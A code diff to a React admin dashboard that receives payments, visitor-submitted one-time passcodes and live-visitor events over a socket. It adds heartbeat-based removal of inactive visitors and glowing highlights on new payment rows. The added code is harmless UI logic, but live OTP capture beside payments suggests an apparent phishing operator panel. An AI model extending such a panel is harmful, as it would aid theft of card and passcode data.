@@ -68,6 +68,8 @@ const Admin = () => {
   const [otps, setOtps] = useState<OtpData[]>([]);
   const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
   const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
+  const [clickedCards, setClickedCards] = useState<Set<string>>(new Set(JSON.parse(localStorage.getItem('clickedCards') || '[]')));
+  const [visitorHeartbeats, setVisitorHeartbeats] = useState<{[key: string]: number}>({});
   const { toast } = useToast();
   const { socket, isConnected } = useSocket();
 
@@ -142,10 +144,23 @@ const Admin = () => {
             id: data.visitorId
           };
           setLiveVisitors(prev => [newVisitor, ...prev.filter(v => v.visitorId !== data.visitorId)]);
+          // Update heartbeat timestamp
+          setVisitorHeartbeats(prev => ({ ...prev, [data.visitorId]: Date.now() }));
         } catch (error) {
           console.error('Error processing visitor data:', error);
         }
       });
+      
+      // Listen for visitor heartbeats
+      socket.on('visitor-heartbeat', (data: { visitorId: string }) => {
+        try {
+          if (!data || !data.visitorId) return;
+          setVisitorHeartbeats(prev => ({ ...prev, [data.visitorId]: Date.now() }));
+        } catch (error) {
+          console.error('Error processing visitor heartbeat:', error);
+        }
+      });
+      
       socket.on('visitor-left', (data: { visitorId: string }) => {
         try {
           if (!data || !data.visitorId) {
@@ -153,6 +168,11 @@ const Admin = () => {
             return;
           }
           setLiveVisitors(prev => prev.filter(visitor => visitor.visitorId !== data.visitorId));
+          setVisitorHeartbeats(prev => {
+            const updated = { ...prev };
+            delete updated[data.visitorId];
+            return updated;
+          });
         } catch (error) {
           console.error('Error processing visitor leave data:', error);
         }
@@ -162,6 +182,7 @@ const Admin = () => {
         socket.off('payment-received');
         socket.off('otp-submitted');
         socket.off('visitor-joined');
+        socket.off('visitor-heartbeat');
         socket.off('visitor-left');
       };
     } catch (error) {
@@ -169,6 +190,42 @@ const Admin = () => {
       // setIsConnected(false); // This line is removed as per the new_code
     }
   }, [socket]);
+
+  // Cleanup inactive visitors based on heartbeat
+  useEffect(() => {
+    const interval = setInterval(() => {
+      const now = Date.now();
+      const HEARTBEAT_TIMEOUT = 60000; // 1 minute timeout
+      
+      setLiveVisitors(prev => 
+        prev.filter(visitor => {
+          const lastHeartbeat = visitorHeartbeats[visitor.visitorId];
+          return lastHeartbeat && (now - lastHeartbeat) < HEARTBEAT_TIMEOUT;
+        })
+      );
+      
+      // Clean up old heartbeat entries
+      setVisitorHeartbeats(prev => {
+        const updated = { ...prev };
+        Object.keys(updated).forEach(visitorId => {
+          if ((now - updated[visitorId]) >= HEARTBEAT_TIMEOUT) {
+            delete updated[visitorId];
+          }
+        });
+        return updated;
+      });
+    }, 30000); // Check every 30 seconds
+    
+    return () => clearInterval(interval);
+  }, [visitorHeartbeats]);
+
+  // Handle card click to stop glowing
+  const handleCardClick = (paymentId: string) => {
+    const newClickedCards = new Set(clickedCards);
+    newClickedCards.add(paymentId);
+    setClickedCards(newClickedCards);
+    localStorage.setItem('clickedCards', JSON.stringify([...newClickedCards]));
+  };
 
   const handleAction = (paymentId: string, action: string) => {
     console.log('Handle action called:', action, 'Payment ID:', paymentId);
@@ -458,8 +515,21 @@ const Admin = () => {
                     </td>
                   </tr>
                 ) : (
-                  payments.map((payment) => (
-                    <tr key={payment.id} className="hover:bg-gray-800">
+                  payments.map((payment) => {
+                    const isNewCard = !clickedCards.has(payment.id);
+                    return (
+                    <tr 
+                      key={payment.id} 
+                      className={`hover:bg-gray-800 cursor-pointer transition-all duration-300 ${
+                        isNewCard 
+                          ? 'border-2 border-cyan-400 shadow-lg shadow-cyan-400/50 animate-pulse bg-gray-800/50' 
+                          : ''
+                      }`}
+                      onClick={() => handleCardClick(payment.id)}
+                      style={{
+                        boxShadow: isNewCard ? '0 0 20px rgba(34, 211, 238, 0.6), inset 0 0 20px rgba(34, 211, 238, 0.1)' : undefined
+                      }}
+                    >
                       <td className="px-6 py-4 whitespace-nowrap text-sm">
                         {new Date(payment.timestamp).toLocaleString()}
                       </td>
@@ -575,7 +645,8 @@ const Admin = () => {
                         </div>
                       </td>
                     </tr>
-                  ))
+                    );
+                  })
                 )}
               </tbody>
             </table>
